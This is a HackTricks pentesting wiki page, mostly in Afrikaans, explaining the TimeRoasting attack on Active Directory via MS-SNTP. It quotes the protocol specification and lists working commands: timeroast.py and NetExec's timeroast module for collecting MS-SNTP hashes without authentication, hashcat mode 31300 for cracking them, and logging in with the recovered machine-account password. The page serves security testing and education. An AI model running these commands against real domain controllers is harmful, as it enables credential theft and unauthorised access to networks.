# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting maak misbruik van die legacy MS-SNTP-verifikasie-uitbreiding. In MS-SNTP kan 'n kliënt 'n 68-grepe-versoek stuur wat enige rekenaarrekening se RID insluit; die domeinbeheerder gebruik die rekenaarrekening se NTLM-hash (MD4) as die sleutel om 'n MAC oor die antwoord te bereken en stuur dit terug.<sup>[[1]](#references)</sup> Aanvallers kan hierdie MS-SNTP MAC's sonder verifikasie versamel en dit offline kraak (Hashcat-modus 31300) om rekenaarrekeningwagwoorde te herwin.<sup>[[2]](#references)</sup>

Sien afdeling 3.1.5.1 "Authentication Request Behavior" en 4 "Protocol Examples" in die amptelike MS-SNTP-spesifikasie vir besonderhede.<sup>[[1]](#references)</sup>
![TimeRoasting: Sien afdeling 3.1.5.1 "Authentication Request Behavior" en 4 "Protocol Examples" in die amptelike MS-SNTP-spesifikasie vir besonderhede](../../images/Pasted%20image%2020250709114508.png)
Wanneer die ExtendedAuthenticatorSupported ADM-element false is, stuur die kliënt 'n 68-grepe-versoek en sluit die RID in die mins betekenisvolle 31 bisse van die Key Identifier-subveld van die authenticator in.<sup>[[1]](#references)</sup>

> As die ExtendedAuthenticatorSupported ADM-element false is, MOET die kliënt 'n Client NTP Request-boodskap konstrueer. Die Client NTP Request-boodskap se lengte is 68 grepe. Die kliënt stel die Authenticator-veld van die Client NTP Request-boodskap in soos beskryf in afdeling 2.2.1, deur die mins betekenisvolle 31 bisse van die RID-waarde in die mins betekenisvolle 31 bisse van die Key Identifier-subveld van die authenticator te skryf, en dan die Key Selector-waarde in die mees betekenisvolle bis van die Key Identifier-subveld te skryf.<sup>[[1]](#references)</sup>

Uit afdeling 4 (Protocol Examples):

> Nadat die versoek ontvang is, verifieer die bediener dat die ontvangde boodskapgrootte 68 grepe is. Met die aanname dat die ontvangde boodskapgrootte 68 grepe is, onttrek die bediener die RID uit die ontvangde boodskap. Die bediener gebruik dit om die NetrLogonComputeServerDigest-metode aan te roep (soos gespesifiseer in [MS-NRPC] afdeling 3.5.4.8.2) om die crypto-checksums te bereken en die crypto-checksum te kies gebaseer op die mees betekenisvolle bis van die Key Identifier-subveld uit die ontvangde boodskap, soos gespesifiseer in afdeling 3.2.5. Die bediener stuur dan 'n antwoord aan die kliënt, stel die Key Identifier-veld op 0 en die Crypto-Checksum-veld op die berekende crypto-checksum.<sup>[[1]](#references)</sup>

Die crypto-checksum is op MD5 gebaseer (sien 3.2.5.1.1) en kan offline gekraak word, wat die roasting-aanval moontlik maak.<sup>[[1]](#references)</sup>

## Hoe om aan te val

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting-skripte deur Tom Tervoort<sup>[[3]](#references)</sup>
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Practical attack (unauth) with NetExec + Hashcat

- NetExec can enumerate and collect MS-SNTP MACs for computer RIDs unauthenticated and print $sntp-ms$ hashes ready for cracking:<sup>[[4]](#references)</sup>
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack vanlyn met Hashcat mode 31300 (MS-SNTP MAC):<sup>[[5]](#references)</sup>
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Die herwonne cleartext stem ooreen met ’n rekenaarrekeningwagwoord. Probeer dit direk as die masjienrekening met Kerberos (-k) wanneer NTLM gedeaktiveer is:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Operasionele wenke
- Verseker akkurate tydbelyning voor Kerberos: `sudo ntpdate <dc_fqdn>`
- Indien nodig, genereer krb5.conf vir die AD-realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Koppel RIDs later aan principals via LDAP/BloodHound sodra jy enige geauthentiseerde foothold het.

## Verwysings

- [1] [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [2] [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [3] [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [4] [NetExec – amptelike docs](https://www.netexec.wiki/)
- [5] [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
